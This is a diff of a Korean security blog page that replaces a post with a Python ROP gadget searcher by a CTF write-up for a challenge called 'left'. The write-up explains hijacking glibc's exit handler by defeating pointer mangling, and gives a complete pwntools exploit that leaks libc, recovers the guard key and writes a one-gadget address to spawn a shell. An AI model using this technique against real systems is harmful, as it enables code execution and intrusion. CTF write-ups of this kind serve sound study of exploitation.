@@ -7,20 +7,19 @@
   
   
   
-  <title>gadget_searcher | 귀찮다</title>
+  <title>0x00_ctf_left | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="경험삼아 대충 만들어봤던 gadget searcher다. 솔직히 정규 표현식 사용하면 더 간결한 코드로 작성할 수 있었겠지만 정확도… 는 핑계고. 그냥 귀찮았다. 별로 써본적도 없고.~~ret 으로 끝나는 가젯밖에 찾지 못한다. 나중에 자동 솔버 작성할때 쓰려고 라이브러리 형식으로 구현해놨다.">
-<meta name="keywords" content="pwnable, tool">
+  <meta name="description" content="libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="gadget_searcher">
-<meta property="og:url" content="https://blog.z2e4o6.com/2018/09/23/gadget-searcher/index.html">
+<meta property="og:title" content="0x00_ctf_left">
+<meta property="og:url" content="https://blog.z2e4o6.com/2018/09/25/0x00-ctf/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="경험삼아 대충 만들어봤던 gadget searcher다. 솔직히 정규 표현식 사용하면 더 간결한 코드로 작성할 수 있었겠지만 정확도… 는 핑계고. 그냥 귀찮았다. 별로 써본적도 없고.~~ret 으로 끝나는 가젯밖에 찾지 못한다. 나중에 자동 솔버 작성할때 쓰려고 라이브러리 형식으로 구현해놨다.">
+<meta property="og:description" content="libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌.">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-23T15:49:41.668Z">
+<meta property="og:updated_time" content="2018-09-24T20:53:19.481Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="gadget_searcher">
-<meta name="twitter:description" content="경험삼아 대충 만들어봤던 gadget searcher다. 솔직히 정규 표현식 사용하면 더 간결한 코드로 작성할 수 있었겠지만 정확도… 는 핑계고. 그냥 귀찮았다. 별로 써본적도 없고.~~ret 으로 끝나는 가젯밖에 찾지 못한다. 나중에 자동 솔버 작성할때 쓰려고 라이브러리 형식으로 구현해놨다.">
+<meta name="twitter:title" content="0x00_ctf_left">
+<meta name="twitter:description" content="libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌.">
   
   
     <link rel="icon" href="/img/one.png">
@@ -252,11 +251,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-gadget-searcher" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-0x00-ctf" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/09/23/gadget-searcher/" class="article-date">
-      <time datetime="2018-09-23T09:46:45.000Z" itemprop="datePublished">2018-09-23</time>
+      <a  href="/2018/09/25/0x00-ctf/" class="article-date">
+      <time datetime="2018-09-24T20:25:54.000Z" itemprop="datePublished">2018-09-25</time>
 </a>
 
     </div>
@@ -270,7 +269,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      gadget_searcher
+      0x00_ctf_left
     </h1>
   
 
@@ -279,16 +278,8 @@
       
       <div class="article-info article-info-post">
         
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/pwnable/">pwnable</a>
-    </div>
-
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-tool/">pwnable, tool</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -296,9 +287,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>경험삼아 대충 만들어봤던 gadget searcher다. 솔직히 정규 표현식 사용하면 더 간결한 코드로 작성할 수 있었겠지만 정확도… 는 핑계고. 그냥 귀찮았다. 별로 써본적도 없고.<br>~~ret 으로 끝나는 가젯밖에 찾지 못한다. 나중에 자동 솔버 작성할때 쓰려고 라이브러리 형식으로 구현해놨다.</p>
+        <p>libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌. </p>
 <a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from capstone import *</span><br><span class="line"> </span><br><span class="line">class Gadget():</span><br><span class="line"> </span><br><span class="line">    def __init__(self, path):</span><br><span class="line">        self.elf = ELF(path)</span><br><span class="line">        self.text = self.elf.get_section_by_name(&apos;.text&apos;)</span><br><span class="line">        self.cmd = []</span><br><span class="line">        self.assm = []</span><br><span class="line">        self.addr = []</span><br><span class="line">        self.ve = &#123;&#125;</span><br><span class="line">        self.ppr = []</span><br><span class="line">        if self.elf.bits == 32:</span><br><span class="line">            self.md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line">        else:</span><br><span class="line">            self.md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">        self.gadget = []</span><br><span class="line">    def dissasm(self, data, adddr):</span><br><span class="line">        return  self.md.disasm(data, adddr)</span><br><span class="line">    def find_(self):</span><br><span class="line">        addr_ = self.text.header.sh_addr</span><br><span class="line">        tmp = self.dissasm(self.text.data(),addr_)</span><br><span class="line">        for i in tmp:</span><br><span class="line">            a = str(i.mnemonic+&quot; &quot;+i.op_str)</span><br><span class="line">            b = str(hex(i.address))</span><br><span class="line">            self.cmd.append(a)</span><br><span class="line">            self.addr.append(b)</span><br><span class="line">            print hex(i.address) + &quot; : &quot; + i.mnemonic +&quot; &quot; + i.op_str</span><br><span class="line">            self.ve[a] = b</span><br><span class="line">    def find_gadget(self,c):</span><br><span class="line">        self.find_()</span><br><span class="line">        buf = &quot;&quot;</span><br><span class="line">        table = self.cmd</span><br><span class="line">        tmp = table.count(&apos;ret &apos;)</span><br><span class="line">        log.info(&quot;Analysing . . .  &quot;)</span><br><span class="line">        if tmp == 0:</span><br><span class="line">            log.info(&quot;No gadget(RET) found&quot;)</span><br><span class="line">            return -1</span><br><span class="line">        for i in range(0, tmp):</span><br><span class="line">            buf = &quot;&quot;</span><br><span class="line">            a = table.index(&apos;ret &apos;)</span><br><span class="line">            for j in range(a-c, a+1):</span><br><span class="line">                buf += table[j] + &quot;;&quot;</span><br><span class="line"> </span><br><span class="line">            aa = self.ve[table[a-c]] + &quot; : &quot; + buf</span><br><span class="line"> </span><br><span class="line">            if table[a-c][:3] == &quot;pop&quot;:</span><br><span class="line">                self.ppr.append(self.ve[table[a-c]])</span><br><span class="line">            self.gadget.append(aa)</span><br><span class="line">            print aa</span><br><span class="line">            del table[a]</span><br><span class="line"> </span><br><span class="line">        return self.gadget</span><br></pre></td></tr></table></figure>
+<p>  exit_funcion 구조체. 값을 써주고 바로 exit 호출하며 나가버리기에, exit_handler 에 값을 써넣으면 쉘을 딸 수 있음.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct exit_function</span><br><span class="line">  &#123;</span><br><span class="line">    /* `flavour&apos; should be of type of the `enum&apos; above but since we need</span><br><span class="line">       this element in an atomic operation we have to use `long int&apos;.  */</span><br><span class="line">    long int flavor;</span><br><span class="line">    union</span><br><span class="line">      &#123;</span><br><span class="line">        void (*at) (void); &lt;-- *next + 24 (rax+0x18)</span><br><span class="line">        struct</span><br><span class="line">          &#123;</span><br><span class="line">            void (*fn) (int status, void *arg);</span><br><span class="line">            void *arg;</span><br><span class="line">          &#125; on;</span><br><span class="line">        struct</span><br><span class="line">          &#123;</span><br><span class="line">            void (*fn) (void *arg, int status);</span><br><span class="line">            void *arg;</span><br><span class="line">            void *dso_handle;</span><br><span class="line">          &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">struct exit_function_list</span><br><span class="line">  &#123;</span><br><span class="line">    struct exit_function_list *next;</span><br><span class="line">    size_t idx;</span><br><span class="line">    struct exit_function fns[32];</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>exit_function_list *next +24에 값을 써넣으면 된다. 그런데</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  0x00007ffff7e1a7fa &lt;+122&gt;:	cmp    rdx,0x2</span><br><span class="line">   0x00007ffff7e1a7fe &lt;+126&gt;:	jne    0x7ffff7e1a819 &lt;__run_exit_handlers+153&gt;</span><br><span class="line">   0x00007ffff7e1a800 &lt;+128&gt;:	mov    rdx,QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7e1a804 &lt;+132&gt;:	mov    rsi,QWORD PTR [rax+0x20]</span><br><span class="line">   0x00007ffff7e1a808 &lt;+136&gt;:	mov    edi,ebp</span><br><span class="line">   0x00007ffff7e1a80a &lt;+138&gt;:	ror    rdx,0x11</span><br><span class="line">   0x00007ffff7e1a80e &lt;+142&gt;:	xor    rdx,QWORD PTR fs:0x30</span><br><span class="line">==&gt;   0x00007ffff7e1a817 &lt;+151&gt;:	call   rdx</span><br><span class="line">   0x00007ffff7e1a819 &lt;+153&gt;:	mov    esi,ebx</span><br><span class="line">   0x00007ffff7e1a81b &lt;+155&gt;:	xor    eax,eax</span><br><span class="line">   0x00007ffff7e1a81d &lt;+157&gt;:	cmp    DWORD PTR [rip+0x1841b4],0x0        # 0x7ffff7f9e9d8 &lt;__libc_multiple_threads&gt;</span><br><span class="line">   0x00007ffff7e1a824 &lt;+164&gt;:	je     0x7ffff7e1a82f &lt;__run_exit_handlers+175&gt;</span><br><span class="line">   0x00007ffff7e1a826 &lt;+166&gt;:	lock cmpxchg DWORD PTR [r14],esi</span><br><span class="line">   0x00007ffff7e1a82b &lt;+171&gt;:	jne    0x7ffff7e1a835 &lt;__run_exit_handlers+181&gt;</span><br><span class="line">   0x00007ffff7e1a82d &lt;+173&gt;:	jmp    0x7ffff7e1a84b &lt;__run_exit_handlers+203&gt;</span><br><span class="line">   0x00007ffff7e1a82f &lt;+175&gt;:	cmpxchg DWORD PTR [r14],esi</span><br></pre></td></tr></table></figure>
+<p>+128에 있는 명령을 보면 알 수 있듯 rdx엔 *next+24의 값이 들어가고, ror 연산과 xor 연산을 거쳐 변조 되므로, 역연산해서 써넣어야 할 값을 알아내야 함.</p>
+<p><code> fs:0x30 - &gt; _dl_fini </code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process([&quot;./left&quot;])</span><br><span class="line">v = 0xffffffffffffffffL</span><br><span class="line">rol = lambda x : (x &lt;&lt; 0x11 &amp; v)|(x &gt;&gt; 64-(0x11))</span><br><span class="line">ror = lambda x : ((x&gt;&gt;64-(0x11) &amp; v)) | (x &gt;&gt; 0x11)</span><br><span class="line">l = ELF(&quot;/libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;printf(): &quot;)</span><br><span class="line">data = int(p.recv(15))</span><br><span class="line">log.info(&quot;printf addr: 0x%08x&quot;%data)</span><br><span class="line"></span><br><span class="line">libc_base = data - l.symbols[&apos;printf&apos;]</span><br><span class="line">log.info(&quot;libc_base : 0x%08x&quot;% libc_base)</span><br><span class="line">atexit = libc_base + l.symbols[&apos;__cxa_atexit&apos;]</span><br><span class="line">leak = atexit+24</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(leak))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">rdx = int(p.recv(15))</span><br><span class="line">real_addr = ror(rdx)</span><br><span class="line"></span><br><span class="line">df = libc_base + 0x3daab0 # _dl_fini </span><br><span class="line">log.info(&quot;df : 0x%08x&quot; % df)</span><br><span class="line">key = real_addr ^ df</span><br><span class="line"></span><br><span class="line">magic1 =(libc_base + 0x4526a)^key</span><br><span class="line">magic2 = rol(magic1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(leak))</span><br><span class="line">p.sendline(str(magic2))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -307,25 +303,21 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2018/09/23/gadget-searcher/">gadget_searcher</a></p>
+        <p><span>제목:</span><a  href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2018년09월23일 - 18시46분</p>
-        <p><span>마지막 업데이트:</span>2018년09월24일 - 00시49분</p>
+        <p><span>발행 시간:</span>2018년09월25일 - 05시25분</p>
+        <p><span>마지막 업데이트:</span>2018년09월25일 - 05시53분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2018/09/23/exploit-exercise-fusion-00/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          exploit_exercise_fusion_00
-        
-      </div>
-    </a>
   
+    <a  href="/2018/09/24/0ctfbabyheap/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">0ctfbabyheap</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
   
 </nav>
 
@@ -408,13 +400,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/09/23/exploit-exercise-fusion-00/" title="上一篇: exploit_exercise_fusion_00">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="HOME"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/" title="HOME"><i class="fa fa-home"></i></a>
+            <a  href="/2018/09/24/0ctfbabyheap/" title="下一篇: 0ctfbabyheap">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/0ctfbabyheap/">0ctfbabyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
